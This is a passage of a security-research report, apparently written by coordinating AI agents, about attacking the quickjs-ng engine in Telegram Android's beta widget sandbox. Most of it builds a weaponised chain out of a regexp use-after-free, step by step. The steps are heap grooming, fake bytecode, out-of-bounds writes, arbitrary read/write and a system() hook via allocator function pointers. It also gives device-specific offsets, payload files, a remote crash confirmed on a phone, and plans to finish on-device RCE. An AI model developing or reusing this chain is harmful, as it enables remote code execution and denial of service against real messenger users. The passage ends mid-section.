# quickjs-ng memory-safety hunt — Telegram Android 13.2.0 beta widget sandbox

Date: 2026-11-01
Scope: offline research only (no phone, no device, no widget DB touched).
Target: `Android_Beta_13.2.0_(72789).apk`, `lib/arm64-v8a/libtmessages.49.so`
(sha256 of APK `23727eb4208488faf50d96ab8b9cd2574b6cb01ee5e33e4de05a1aee1aeee861`).
Engine: quickjs-ng **v0.17.0** (fingerprinted, see §2), 6 MiB JS heap, 500 ms/script
CPU budget with a 300 ms/1000 ms sliding quota, no host/network APIs.

Excluded per instruction (other agents own them): **#1792** (js_array_find, settled),
**#1835/#1844** (WeakMap symbol-value UAF), **#1570** (async-generator cycle-GC UAF).

---

## 1. Ranked shortlist

| # | Candidate | Class | App-reachable? | Script survives? | Evidence | Verdict |
|---|-----------|-------|----------------|------------------|----------|---------|
| 1 | **PR #1827** — `JS_RegExpDelete` stale bytecode pointer (UAF) + attacker bytecode execution + OOB 8-byte read/write | UAF → arbitrary R/W → **lab RCE**; **device: confirmed remote DoS** | **YES, device-confirmed** — plain JS, no GC, no interrupt, ~30 ms, ~414 KB heap | lab: 10/10 with the t12 geometry; **device: fast path reached, SIGABRT in `lre_exec+0x1868`**; device class-80 layout differs (v3 `NO_ANCHOR` on all FILL values) | ASan `libregexp.c:3119`; app-model 6 MiB 10/10; **`system("id > file")` in lab/app-model**; device abort backtrace through `JS_RegExpDelete` | **lab RCE + device DoS; on-device RCE pending the multi-string scan calibration (§3D)** |
| 2 | **issue #1865** — captured-variable count truncation (`uint16_t var_ref_count`) → OOB r/w + generator UAF | OOB R/W + UAF, upstream claims working RCE | **NO at 6 MiB** — needs 65 536 captured vars; parse OOMs at 6/8/9 MiB, needs ≥10 MiB | n/a (SIGSEGV at 10 MiB) | ASan `quickjs.c:17837` (close_lexical_var) on v0.17.0 | keep on file; revisit only if the heap limit assumption changes |
| 3 | **PR #1782** — parser OOM leaves truncated opcode, `resolve_variables()` reads past DynBuf | OOB read (≤4 bytes) | **YES** (app can force parser OOM at 6 MiB) | yes (read only) | upstream report only, not reproduced here | low: crash-only at best |
| 4 | **PR #1790** — `JS_IteratorNext2` fast path skips C-stack check | native stack overflow | **NO at 6 MiB** — 10 k chain throws RangeError, ≥30 k OOMs before overflow | n/a | local app-model runs | not usable |
| — | #1853 BJSON `cpool_count` overflow | heap OOB | **NO** — needs `JS_ReadObject(JS_READ_OBJ_BYTECODE)`; widget JS is source, never bytecode | n/a | upstream | not reachable |
| — | #1833 / #1762 module & raw-context lifetime aborts | abort / leak | **NO** — classic scripts; no module loader / raw context in the sandbox | n/a | upstream | not reachable |
| — | #1847/#1770 TypedArray species content type | spec violation | yes but **not memory-unsafe**: slice's fast path requires `p->class_id == p1->class_id`; other paths use generic Get/Set | yes | source audit | no primitive |
| — | #1760/#1761 ArrayBuffer resize ToIndex | wrap to 2^64 | yes but semantic only; length is re-checked after conversion | yes | source audit | no primitive |

WebAssembly is **not compiled into the app binary** (`strings` count 0) — no WASM surface.

---

## 2. Snapshot determination (shared fingerprint)

The app's engine is **v0.17.0** (or a post-0.17 commit before 2026-10-09). Two independent
static fingerprints:

1. **Class-definition table.** The `JSClassShortDef` array lives at `.data.rel.ro:0x1949d20`
   (found by scanning `.rela.dyn` R_AARCH64_RELATIVE addends for four consecutive 24-byte
   entries with the same finalizer pointer). Entry order and atom ids match
   `quickjs-atom.h` v0.17.0 exactly:

   ```
   atom 174 Uint8ClampedArray … 185 Float64Array, 186 DataView, 187 BigInt,
   atom 190 Map, 191 Set, 192 WeakMap, 193 WeakSet, 194 Iterator, 195 IteratorConcat,
   196 IteratorHelper, 197 IteratorWrap
   finalizer of Map/Set/WeakMap/WeakSet = 0x173899c (js_map_finalizer)
   ```

2. **Atom-list delta.** The only commit in `v0.17.0..v0.18.0` that changes atom numbering is
   `c359cac` (2026-10-09, removes `DEF(concat)` at index ~101). Had the app included it,
   `Map` would be atom 189, not 190. Therefore the app snapshot is **pre-2026-10-09**, i.e.
   v0.17.0 or a very small delta of it.

Consequence: **every fix merged after 2026-10-09 is absent** unless Telegram backported it
(the project does not backport quickjs-ng patches). Candidates fixed/opened after that date
(#1827, #1865, #1782, #1790, #1853, the whole v0.18.0 release) are all live in the app.

*Cross-reference for the #1835 agents:* the same table/atom evidence is theirs to reuse;
`js_map_finalizer` at `0x173899c` in the shipped binary has the pre-#1844 single-loop shape
(one records loop with the `is_weak` branch inside), so #1844 is absent too.

---

## 3. Candidate 1 (recommended): PR #1827 — `JS_RegExpDelete` stale bytecode

**Links:** <https://github.com/quickjs-ng/quickjs/pull/1827> (opened 2026-10-15, still open
on 2026-11-01 — the fix is *not merged*, so no released engine, and certainly not the app,
can contain it).

### 3.1 Root cause (v0.17.0 source)

`quickjs.c:49944` `JS_RegExpDelete()` — the fast path of `String.prototype.replace` when the
replacement is empty, the regexp is global, and `exec` is the builtin:

```c
re_bytecode = str8(re->bytecode);          /* borrowed pointer, taken too early */
re_flags = lre_get_flags(re_bytecode);
...
val = JS_GetProperty(ctx, this_val, JS_ATOM_lastIndex);
if (JS_IsException(val) || JS_ToLengthFree(ctx, &last_index, val))   /* <-- runs JS */
    goto fail;
alloc_count = lre_get_alloc_count(re_bytecode);   /* stale */
capture = js_malloc(ctx, sizeof(capture[0]) * alloc_count);
...
lre_exec(capture, re_bytecode, ...);              /* executes freed bytecode */
```

`JS_ToLengthFree` invokes `valueOf()` on the `lastIndex` value. That callback can call
`re.compile(newPattern)`; `js_regexp_compile()` frees `re->pattern` and `re->bytecode`
(`quickjs.c:49456`). `re->bytecode` is an **INDIRECT** `JSString` (`quickjs.c:49272`) whose
data pointer is the `lre_compile()` DynBuf — the buffer is freed by
`JS_FreeValue(JS_MKPTR(JS_TAG_STRING, re->bytecode))`.

`js_regexp_exec()` does this in the correct order (lastIndex coercion first, bytecode
snapshot after — `quickjs.c:49744`); only the delete path is wrong.

### 3.2 Exact trigger (needs the `exec` getter, not a plain `lastIndex` object)

`Symbol.replace` first does `rx.lastIndex = 0`, which would destroy a planted object, and
`lastIndex` is non-configurable on RegExp instances. The reachable way to plant an object
after that reset is the `exec` probe inside `js_is_standard_regexp()`:

```js
const re = /<long pattern>/g;
Object.defineProperty(re, "exec", {
  configurable: true,
  get() {
    Object.defineProperty(re, "exec", {value: RegExp.prototype.exec, writable: true, configurable: true});
    re.lastIndex = { valueOf() { re.compile("x", "g"); /* + reclaim here */ return 0; } };
    return RegExp.prototype.exec;
  }
});
"a".replace(re, "");       // empty replacement + global + builtin exec -> JS_RegExpDelete
```

### 3.3 Freed object, size class, reclaim

* Freed: the `lre_compile` DynBuf backing the compiled regexp. Measured with an
  instrumented build: pattern `"abcdefghij".repeat(300)` → bytecode `size=9024`,
  DynBuf `allocated_size=11623`; the allocation handed to `js_malloc` is 11 623 B (+8 B
  quickjs arena header). This is **> 2 KB, so Android Scudo does not quarantine it**
  (`QuarantineChunksUpToSize` = 2048 B, per the project's earlier Scudo notes) — the next
  same-size allocation gets it back immediately.
* Reclaim: `new Uint8Array(11623)` inside `valueOf()` after `re.compile()`, filled with the
  fake bytecode, **kept alive in a global** (`globalThis.keep = buf`). If the buffer is a
  local it is freed when `valueOf` returns and the block reverts to free-list metadata —
  this detail cost one debugging cycle and is easy to get wrong.
* Verified: with an instrumented build the bytes at the stale pointer became the attacker
  fill (`hdr=ab ab ab ab ab ab ab ab`); the ASan run below proves the fake program is
  actually executed.

### 3.4 Primitive: attacker-controlled libregexp bytecode, OOB read + write

Fake bytecode layout (all attacker-controlled):

```
[0..1] flags (u16)          [2] capture_count (u8)   [3] register_count (u8)
[4..7] bytecode_len (u32, unused by lre_exec)
[8..]  opcodes
```

`lre_exec()` sizes the capture array as `alloc_count = 2*capture_count + register_count`
bytes/8 — i.e. **from the same fake header**. `lre_exec_backtrack()` then executes:

* `REOP_save_start(0)` / `REOP_save_end(0)` — bounds-checked against `capture_count`.
* `REOP_set_i32` (`libregexp.c:3116`):

```c
idx = 2 * s->capture_count + pc[0];      /* pc[0] is 0..255, NOT checked */
val = get_u32(pc + 1);                   /* attacker-chosen 32-bit value */
pc += 5;
SAVE_CAPTURE_CHECK(idx, (void *)(uintptr_t)val);
```

`SAVE_CAPTURE_CHECK` first **reads** `capture[idx]` (to save the old value for backtracking)
and then **writes** `capture[idx] = value`. There is no bounds check against `alloc_count`.
With `register_count = 0`, `pc[0] = 255`, `capture_count = C`:

* array size = `16*C` bytes,
* write index = `2*C + 255`,
* **OOB distance = 255*8 = 2040 bytes past the array**, or in general
  `(pc[0] - register_count) * 8` for `pc[0] > register_count`.
* value: any 32-bit constant (zero-extended 64-bit store), or a heap pointer into the
  input string via `REOP_set_char_pos` (same unchecked index).

This is a **repeating, precisely offset-controlled 8-byte heap write** with a value the
script chooses, performed while the engine continues to run.

### 3.5 Local results (raw)

ASan (v0.17.0 tag, `-DQJS_ENABLE_ASAN=ON -DQJS_ENABLE_UBSAN=ON`), fake program with
`capture_count=33, register_count=0`, `set_i32 reg 255`:

```
==3551894==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x516000001090
READ of size 8 at 0x516000001090 thread T0
    #0 lre_exec_backtrack  libregexp.c:3121
    #1 lre_exec            libregexp.c:3421
    #2 JS_RegExpDelete     quickjs.c:49991
    #3 js_regexp_Symbol_replace quickjs.c:50463
...
0x516000001090 is located 518 bytes after 522-byte region [0x516000000c80,0x516000000e8a)
SUMMARY: AddressSanitizer: heap-buffer-overflow libregexp.c:3121
```

With an instrumented build the same run prints the exact geometry:

```
[exec] set_i32 capture=0x516000000688 capture_count=33 idx=321 off=2568 val=1094861636
```

i.e. `capture` is the 66-slot (528-byte) array, `idx=321` is 2568 bytes from its
start — 2040 bytes past its end (ASan names the nearest preceding allocation it knows,
hence the 522-byte region in the message, not the capture array itself).

The reported access is the read half of `SAVE_CAPTURE_CHECK`; the store to the same address
is the immediately following instruction (macro at `libregexp.c:2873`). Note ASan only
reaches this point with `ASAN_OPTIONS=quarantine_size_mb=0:thread_local_quarantine_size_kb=0`
and an exactly matching allocation size (11 623 B): ASan's secondary allocator otherwise
never reuses the freed block, so a stock ASan run instead reports the earlier UAF at
`lre_get_alloc_count`.

Release build (no sanitizer), same PoC, 40 runs: **19 survived, 21 SIGSEGV** — the OOB
store lands in live heap and is not benign. When it survives the script continues
(`AFTER` printed, `result=[]`), and the fake-bytecode semantics are observable
(e.g. input `"x"` with `/x/` yields `"x"` instead of `""`, proving the fake program ran).

Crash backtrace when it lands badly (downstream corruption, not the store itself):

```
SIGSEGV in string_buffer_write8  quickjs.c:4579  (p = 0x555600000000)
  <- JS_RegExpDelete quickjs.c:50022 <- js_regexp_Symbol_replace
```

**App model** (6 MiB limit, 300 ms per-eval budget, same context reused for a second
`<script>`, no teardown, `print` removed):

```
[eval 1] poc1827_oob_app.js  ok   mem_used=114232 malloc_count=1115
[eval 2] poc1827_check.js    ok   mem_used=114272 malloc_count=1116
[done] leaving context alive (no teardown)
```

Script 2 asserts `globalThis.W1 === 1`; when it runs, the engine kept working after the
corrupting store. Across 20 runs of the two-script app model: **11 continued to script 2,
9 died with SIGSEGV** — the same live-heap corruption rate as the standalone release
binary (19/40 survived). Heap cost ~114 KB; wall time per trigger ~1.5 ms (20 process runs
in 30 ms). **No GC stress, no CPU interrupt, no timer chunking needed** — the whole
sequence is one synchronous `String.prototype.replace` call, far below any budget.

### 3.6 Exploitation path (concrete, partially proven)

Proven: free → reclaim with attacker bytes → attacker bytecode executes → unchecked
`capture[idx]` read/write with controlled index and value → live-heap corruption → script
can continue.

Still to do (the actual weaponisation):

1. **Aim the write.** `capture` is `js_malloc(8*alloc_count)` immediately before
   `lre_exec`; nothing allocates between `valueOf`'s return and that allocation except
   `JS_ToLengthFree`. Choose `capture_count`/`register_count` so the array has the same
   size class as a victim the script frees last inside `valueOf` (glibc/Scudo LIFO), then
   the array reuses the victim's chunk and the OOB store lands a fixed distance
   (`(pc[0]-register_count)*8`) into the *following* chunk. My first adjacency attempt
   (two 2016-byte `Uint8Array`s, free the first, write +40 B past a 2016-byte capture
   array) did **not** hit the surviving buffer — heap feng shui is the open work item.
2. **Choose the victim.** With `REOP_set_i32` (32-bit constant) the natural targets are a
   `JSString.len` field (→ over-long string → OOB read / info leak), an array
   `count`/`values` pointer, or an `ArrayBuffer.data` pointer. With `REOP_set_char_pos`
   the store value is a valid heap pointer into the input string, useful to plant a
   pointer where a pointer is expected.
3. **Multi-shot.** Each trigger is a new `replace()` call with a fresh long regexp; the
   script can repeat it many times per `<script>`, so failed attempts that do not crash
   can be retried and writes can be composed.

Honest statement: this is a **write/type-confusion primitive with attacker-controlled
bytecode**, not a demonstrated RCE. The upstream PR treats it as a semantic bug; the UAF
is real and ASan-visible, and the unchecked register index is what turns it into memory
corruption.

### 3.7 Binary-presence check for the reverse agent

Not strictly needed: the fix is unmerged upstream, the app predates it, and the app
contains libregexp (`"corrupted bytecode in regexp execution"`, `"out of memory in regexp
execution"` each appear once in `libtmessages.49.so`). If confirmation is wanted:

* Locate `JS_RegExpDelete` by xref to those two strings (they are in its error switch).
* In the shipped binary the order must be: `str8(re->bytecode)` / `lre_get_flags` **before**
  the `JS_GetProperty(lastIndex)` + `JS_ToLengthFree` pair, then `lre_get_alloc_count`.
  The fixed version (PR #1827) moves the lastIndex coercion first; if the call order is
  reversed the fix is present.
* Constants to look for: `lre_get_alloc_count` = `hdr[2]*2 + hdr[3]` byte loads at offsets
  2 and 3 of the bytecode buffer; `lre_exec`'s `REOP_set_i32` case computes
  `2*capture_count + pc[0]` with no compare against the register count.

---

## 3A. Weaponization: from UAF to arbitrary R/W and lab RCE (2026-11-01)

Everything below was built on the §3 primitive and verified on the v0.17.0 tag with the
6 MiB / 300 ms app-model harness. Commands and raw output are in
`lab/qjs_bughunt/RESULTS.md`.

### 3A.1 Primitive ladder (all steps verified)

| Step | Mechanism | Result | Reliability |
|---|---|---|---|
| 1 | Fake `REOP_set_i32` writes 8 bytes onto a chosen `JSString.len` field | 2 GB string, OOB heap read | 10/10 (write); the OOB read then leaks adjacent heap |
| 2 | Same store onto a `Uint8Array` view's `JSObject.u.array.count` (offset 64) | `length = 0x10000000`; `typed_array_is_oob()` is now true for some getters, but the fast element paths only check `idx < count` | 5/5 |
| 3 | `view[i]` / `view[i] = x` for `i` beyond the 64-byte data buffer | **byte-granular OOB read/write window**, forward from the data buffer (count-limited, 256 MB) | 3/3 (read at 1000, write at 100 verified) |
| 4 | Force new class-80 arena blocks (`2000 × {}`), allocate a fresh `Uint8Array(0x1234)`, find its `JSObject` in the window by signature (`class_id=24`, `count=0x1234`) | the object's cached `u.array.u.uint8_ptr` is writable | found deterministically at ~400 KB into the window |
| 5 | Overwrite `u.array.u.uint8_ptr` with any 64-bit address | **arbitrary-address byte read/write** through that view (count 0x1234 bytes per retarget) | verified: wrote `0x77,0x66` through the retargeted view and read them back in the original window |
| 6 | Leak `Math.sin`'s `JSObject` from an array's JSValue slots, then `+48 → JSContext*`, `ctx+16 → JSRuntime*` | absolute `ctx`, `rt`, `mf.js_free` | 10/10 |

Grooming details that matter:

* The fake bytecode buffer is reclaimed with a `Uint8Array(11623)` **immediately after**
  `re.compile()`; any 2 KB allocation before it makes glibc split the freed 11 623-byte
  bytecode chunk and the reclaim fails (the stale pointer then contains free-list
  metadata and `lre_exec` aborts on an unknown opcode).
* The reclaim buffer must stay alive (`globalThis.keep = buf`); a local is freed when
  `valueOf()` returns.
* For the `u.array.count` aim: `capture_count=1`, `register_count=7` gives a 72-byte
  capture array in the **same arena class (80) as `JSObject`**; a `{}` placeholder at the
  head of the free list is reused by the capture array, and the victim view's `JSObject`
  lands at `capture+0x1A0` (2×80+64) — hence `idx = 68` (`reg 66`).
* `Vec`-style environment (qjs CLI) evaluates files as modules; the app is a classic
  script. Keep globals on `globalThis` in lab scripts (the app variant uses plain `var`).

### 3A.2 Lab RCE via `JSRuntime` allocator hooks

The chain from §3A.1 step 6:

```
js_free = *(uint64_t *)(rt + 16)          // JSRuntime.mf.js_free (js_def_free)
base    = js_free - off(js_def_free)      // PIE base of the embedding binary
free    = *(uint64_t *)(base + off(free@GOT))
libc    = free - off_libc(free)
system  = libc + off_libc(system)
*(uint64_t *)(rt + 16) = system           // via the arbitrary-write view
*(uint64_t *)(rt + 64) = cmd_ptr          // JSMallocState.opaque
free(anything)  ->  system(cmd_ptr)       // js_free(opaque, ptr)
```

Verified offsets for the local build (Debian glibc 2.41; these are lab-specific):

| Binary | `js_def_free` | `free@GOT` |
|---|---|---|
| `build-rel/qjs` | 0x1f950 | 0x151010 |
| `appmodel_rel` | 0xf690 | 0x136000 |
| `lab_widget_6m` | 0xff90 | 0x137000 |

libc: `free=0xa2fc0`, `system=0x53090`. The run also checked the ELF magic at the
computed base (`0x464c457f` = little-endian `\x7fELF`) before writing the hooks.

Raw result (`build-rel/qjs`, full chain in `poc1827_rce.js`):

```
cfunc_obj=...   ctx=...   rt=...   js_free=...
qjs_base=...    magic=464c457f
free@got=7f87258dbfc0   libc_base=7f8725839000   system=7f872588c090
hooked
DONE
$ cat rce_proof
uid=1000(user) gid=1000(user) groups=1000(user),...
```

App-model run (6 MiB limit, 300 ms CPU deadline, classic global script, no teardown,
`appmodel_rel` offsets), 10/10:

```
[eval 1] poc1827_rce_app.js  ok   mem_used=413240 malloc_count=5254
$ cat rce_proof_app
uid=1000(user) gid=1000(user) ...
```

JS-side cost: ~27 ms for the regexp trigger + replace + reclaim; the rest (scans, leaks,
hooks) is well under the 300 ms budget. Peak heap ~414 KB of the 6 MiB.

### 3A.3 What this is and what it is not

* **Demonstrated:** arbitrary-address byte read/write from plain JS in quickjs-ng v0.17.0,
  and full RCE (`system()` with an attacker command) in the lab and in the 6 MiB /
  300 ms app-model harness. The RCE uses the engine's own allocator hook, so it needs no
  JOP/ROP and no code page.
* **Not demonstrated:** on-device exploitation. The app is v0.17.0 and has the same code
  paths, but the final chain needs four target-specific constants:
  `offset(js_def_free)` and `offset(free@GOT)` in `libtmessages.49.so`, and
  `offset(free)` / `offset(system)` in the device's libc. `libtmessages.49.so` imports
  `free`, `malloc` and `dlsym` (not `system`), so the libc path must go through the
  GOT + libc offsets (or an in-memory ELF `dynsym` walk for `system`).
* **Scudo caveat:** the lab used glibc. On Android the 11 623-byte bytecode buffer is a
  Scudo chunk (> 2 KB, so outside the 2 KB quarantine) and the same-size `Uint8Array`
  should reuse it; this is the one allocator behaviour that must be confirmed on-device.
* The widget payload template is `lab/qjs_bughunt/widget_poc_1827_rce.html` with the four
  constants marked `TODO`. The real `sandbox-bundle.js` wrapper only deletes host APIs and
  evaluates scripts as globals, so it does not change the exploit; the provided harness
  (`lab_widget.c`) does not dispatch scripts in its current form (same behaviour with the
  prior session's HTML), so the app-model harness is the authoritative test here.

### 3A.4 Device constants for the reverse agent

To finish the on-device chain, the reverse agent needs:

1. `js_def_free` (the function stored in the default `JSMallocFunctions` at `rt+16`):
   locate the `def_malloc_funcs` table in `libtmessages.49.so` (the runtime is created by
   `JS_NewRuntime`, which references `js_def_malloc/js_def_free/js_def_realloc`), or
   simply read `rt+16` at runtime once `rt` is leaked — the offset subtraction only needs
   the function's file offset.
2. `free@GOT` (`.rela.plt` slot for `free`, imported by the library) — its file offset.
3. The device libc's `free` and `system` offsets (or a `dlsym`-based resolution using the
   imported `dlsym`; note `dlsym`'s first argument would be the `opaque` pointer, so the
   direct `system` hook is cleaner).

---

## 3B. Device payload v2 (2026-11-01) — SUPERSEDED by §3C

**Superseded:** the v2 anchor used `views[i].length > 1e6`; the arena agent's correction
is adopted in §3C (indexing anchor, `ta[100]`). File kept as
`lab/qjs_bughunt/widget_poc_1827_rce_device.html` for history only.

File: `lab/qjs_bughunt/widget_poc_1827_rce_device.html`
Procedure: `lab/qjs_bughunt/DEVICE_TEST.md`

One classic `<script>`, no host APIs, one synchronous `replace()`, reclaim buffer kept in
a global. Config block (constants now resolved in `notes/qjs_binary_checks.md` §13):

```
JS_DEF_FREE_OFFSET = 0x1739aec   js_def_free vaddr in libtmessages.49.so
FREE_GOT_OFFSET    = 0x1960430   free@GOT vaddr (file offset 0x195c430; use vaddr)
SYSTEM_MINUS_FREE  = 0x26df0     device bionic (0x64d60 - 0x3df70)
COUNT_IDX          = 88          lab-calibrated for this payload's 4-view structure
CMD = id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof
```

Reverse-agent facts that the payload relies on: `rt+0x10 = mf.js_free` = `js_def_free`
(`mov x0,x1 ; b .free`), `rt+0x40 = malloc_state.opaque`; the `free` JUMP_SLOT is at
vaddr `0x1960430` (BIND_NOW, RELRO, no BTI/PAC); the hijacked call is
`system(opaque, ptr-8)`. **Only large-block frees (size ≥ 505 B) reach `mf.js_free`** in
`js_free_rt`, so the trigger is a 1000-char string (1025-byte allocation), not a small
object.

Changes vs the lab payload, to survive an unknown allocator state:

* four candidate `Uint8Array(64)` views are allocated after the placeholder and the
  payload checks which one actually got `u.array.count = 0x10000000`; if none, it shows
  `NO_ANCHOR` and returns **before** the arbitrary-R/W stage (safe calibration loop:
  88 → 68 → 98 → 108 → 128 → 148 → …);
* the `Math.sin` search no longer dereferences candidate pointers: it identifies the
  array's JSValue backing store by the same pointer repeated at 16-byte strides with tag
  `-1`, then does a single class-id confirmation read;
* the object/C-function scans are bounded by the position of the fresh view's data (the
  only address known to be mapped), not by a flat 512 KB, so the scan cannot walk off the
  heap;
* stage markers (`AFTER`, `NO_ANCHOR`, `NO_WINDOW`, `NO_YOBJ`, `NO_CFUNC`) are written to
  the page text through `document.getElementById("w")` from a rAF/timer callback, so a
  survived run is visible without the proof file;
* `system` is computed as `free + SYSTEM_MINUS_FREE` from the leaked `free` pointer (the
  lib imports `free`/`malloc`/`dlsym`, not `system`).

Lab validation of this exact structure (`poc_device_lab.js`, appmodel offsets, lab libc
delta, `COUNT_IDX=88`): **10/10** produced `rce_proof_device` with the `id` output and
completed the eval under 6 MiB / 300 ms (peak heap ~100 KB). The device HTML differs only
in the config block.

Remaining device unknowns: the two libtmessages offsets; the Scudo reclaim of the
11 623-byte chunk (should hold: > 2 KB is outside the quarantine); and the arena
`COUNT_IDX`, handled by the marker-driven calibration. Not tested on a device.

---

## 3C. Device payload v3 — corrected arena geometry + indexing anchor (2026-11-01)

File: `lab/qjs_bughunt/widget_poc_1827_rce_device_v3.html`
Procedure: `lab/qjs_bughunt/DEVICE_TEST.md` (updated)
Lab validation script: `lab/qjs_bughunt/v3_lab_app.js`

### 3C.1 Corrections adopted

* **Anchor by indexing, not `.length`.** The payload now writes `ta[100]=0x41` after the
  trigger and requires `ta[100] === 0x41`. A normal 80-element view ignores the write and
  reads `undefined`; a count-corrupted view accepts and returns it. `.length` is no longer
  used as a gate.
  (Source nuance: in v0.17.0 the typed-array `.length` getter is
  `JS_CGETSET_DEF("length", js_typed_array_get_length)` at `quickjs.c:61592` and returns
  `u.array.count`, while plain fast arrays store length in `prop[0]`; the arena agent's
  observation applies to the plain-array case. The indexing check is valid either way.)
* **Arena geometry `capture_count=4`, `register_count=1`** (72-byte capture, arena class
  80). The allocation sequence is the arena agent's `t12_clean.js`, which reproduces
  stably: `tmp={}` (b0, reused by the capture), `sv='A'.repeat(47)` (b1, JSString length
  at +0), `ta=new Uint8Array(80)` (buffer object b2, view object b3, `u.array.count` at
  +64), `v1`, `v2`, then `tmp=null`.

```
pc0=2  -> idx 10 -> capture+80  = sv.len              (b1 + 0)
pc0=30 -> idx 38 -> capture+304 = ta.u.array.count    (b3 + 64)
```

The arena note's `pc0=10` (capture+144 = next block +64) was verified separately with a
plain array placed at the next block (`arr[100]=0x41` succeeds, `arr.length` stays 5); the
t12 sequence places the 47-char string `sv` there instead, so the typed-array count is at
+304 and the payload uses `pc0=30`. Both are documented as calibration targets.

Measured in the lab with the instrumented build: `capture=…`, `ta view=capture+0xF0`
(3 blocks), `set_i32 idx 38 addr = ta+0x40` — identical in the app-model 6 MiB run and in
the arena agent's run.

### 3C.2 Chain and constants

Unchanged from v2: fake bytecode → `sv` 2 GB string (arbitrary read) + `ta` count (byte
R/W) → fake INDIRECT string → fake Uint8Array in a values buffer (arbitrary write) →
`ctx`/`rt`/`js_free` → `free@GOT` → `system`.

```
JS_DEF_FREE = 0x1739aec   (libtmessages js_def_free vaddr)
FREE_GOT    = 0x1960430   (free@GOT vaddr)
SYSTEM_MINUS_FREE = 0x26df0
CMD = id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof
trigger: z = new Uint8Array(4096); z = null   (large-block free -> mf.js_free)
```

### 3C.3 Lab validation

`v3_lab_app.js` = the v3 script with the appmodel offsets (`0xf690`/`0x136000`, Debian
libc delta `-0x4ff30`) and the lab command path, run under 6 MiB / 300 ms / classic
global script / no teardown:

```
OUT_LEN=1
ANCHOR_OK
LEAK typed=… taData=… v1vals=… v2vals=…
FAKE_STRING len=2147483392
ARB_READ ctx=… rt=… js_free=…
RESOLVE free=… system=…
HOOK_WRITTEN system=… cmd=…
TRIGGERED
AFTER
$ cat rce_proof_v3
uid=1000(user) gid=1000(user) groups=1000(user),20(dialout),24(cdrom),...
```

**10/10 runs** produced the proof and completed under the 300 ms deadline. This is the
same geometry as the arena agent's `t12_clean.js` (coordination point: `cc=4`, `rc=1`,
`pc0=2` and `30`, `ta` at capture+0xF0).

### 3C.4 Device result for v3

v3 was run on the device (by the device agent): it executed, but reported `NO_ANCHOR` for
every `FILL`/`COUNT_PC0` value tried. The phone's class-80 capture-neighbour layout differs
from the lab, so the fixed `pc0` targets miss. v3 is therefore **lab-only** and is not the
current device path; the arena agent's multi-string scan (§3D) owns that.

---

## 3D. Device status: fast path confirmed, DoS primitive confirmed (2026-11-01)

Hardware result (device agent, Telegram 13.2.0 beta 72789):

* A **minimal fake program** (the PR #1827 trigger + reclaim with a truncated/invalid
  opcode) reaches `lre_exec` and **SIGABRTs at `lre_exec+0x1868`**, with the backtrace
  through `JS_RegExpDelete`. This is the engine's `default: abort()` on an unknown opcode.
* Therefore **W-11 is device-reachable**: `JS_RegExpDelete` does snapshot the bytecode
  before `ToLength(lastIndex)`, the freed buffer is reclaimed, and `lre_exec` executes
  attacker-controlled bytes **on the phone**.
* The earlier `AFTER 0` observation was ambiguous; the SIGABRT is the decisive evidence.

Consequences, stated honestly:

1. **Confirmed on-device impact: remote DoS.** A widget script that triggers the bug with
   an invalid fake opcode aborts the messenger process (`SIGABRT` in `lre_exec`). This is
   the first device-confirmed impact of PR #1827 and needs no allocator geometry beyond the
   successful reclaim.
2. **Fake-bytecode execution is confirmed on-device**, which is the hard half of the RCE
   chain (the UAF + reclaim + interpreter control). The remaining gap is only the class-80
   neighbour calibration needed to turn the interpreter's unchecked `capture[2*cc+pc0]`
   store into the typed-array count/OOB window.
3. v3's fixed geometry missed (`NO_ANCHOR` on all values); the phone's arena state differs
   from the lab. The current device path is the arena agent's **multi-string scan**: N
   47-char strings after the freed `tmp`, the fake program writing `0x7fffffff` at block
   starts (`pc0 = 10n - 8`), then scanning the strings for the over-long one and adapting
   the chain. This report will validate that payload when it lands; no further v3 geometry
   runs are planned here.
4. The arbitrary-R/W → `system()` chain remains lab/app-model-proven only (§3A/§3C); it is
   not claimed for the device until the multi-string variant completes the calibration.
5. **Lab feasibility check of the scan geometry** (`poc_scan_strings.js`; see
   `lab/MULTISTRING_SCAN_LAB_CHECK.md`): N=8 × 47-char strings after `tmp`, sweep
   `pc0=10n-8`; the scan found the over-long string (`len=2147483647`) and its
   `charCodeAt` read OOB (3/3). Only the first two blocks were consecutive in that run;
   the rest of the sweep wrote at other blocks' offset 0 (no crash in 3/3). Practical
   note for the device payload: keep N modest (8–16), report the found index, and prefer
   stopping the sweep at the first hit rather than covering many blocks.

---

## 4. Candidate 2: issue #1865 — captured-variable count truncation

**Link:** <https://github.com/quickjs-ng/quickjs/issues/1865> (opened 2026-11-01, no fix yet;
upstream author claims a working RCE).

Source (v0.17.0, unchanged):

* `capture_var()` — `quickjs.c:33868`: `vd->var_ref_idx = s->var_ref_count++;` (int, unchecked)
* `JSFunctionBytecode.var_ref_count` is `uint16_t` (`quickjs.c:435`); `JSVarDef.var_ref_idx`
  is `uint16_t` (`quickjs.c:493`).
* `async_func_init()` allocates `sizeof(JSVarRef*) * b->var_ref_count` (`quickjs.c:21171`);
  with 65 536 captured vars this wraps to 0.
* `close_lexical_var()` indexes `sf->var_refs[var_ref_idx]` with the untruncated index and
  clears the slot (`quickjs.c:17836`), then `close_var_ref()` can drop the frame's refcount
  while the generator still points at it.

Local results:

* Upstream PoC (32 768 params + 32 767 vars + captured `x`; 873 KB source) on v0.17.0 ASan:
  `heap-buffer-overflow READ of size 8 in close_lexical_var quickjs.c:17837`.
* Compact base-36 variant (676 KB): app model 6 MiB → `InternalError: out of memory`
  during parse (2.17 MB accounted at the failure); 8 MiB → OOM; 9 MiB → OOM;
  **10 MiB → compiles and SIGSEGVs**. The parse peak is dominated by 65 536 vardefs +
  65 536 atoms + the AST, not by source bytes; ~40 % below the 6 MiB budget cannot be
  recovered by shortening names.

Verdict: strongest primitive in the window (OOB r/w + generator UAF, deterministic, no GC
interrupt), but **not reachable in the 6 MiB widget heap as written**. Re-open only if the
6 MiB limit is proven wrong (e.g. the validator context or a second runtime gets a larger
limit) or if a cheaper way to reach 65 536 captures is found.

Binary check (if pursued): `async_func_init` must load the captured-variable count as a
**16-bit** value (`ldrh`) and multiply by 8 for the frame allocation; `close_lexical_var`
must index `frame->var_refs[idx]` with a 16-bit index and no cmp against the count.

---

## 5. Candidate 3/4 (brief)

**PR #1782 — parser OOM OOB read** (<https://github.com/quickjs-ng/quickjs/pull/1782>, open).
When the bytecode `DynBuf` cannot grow, an opcode is left without its operand and
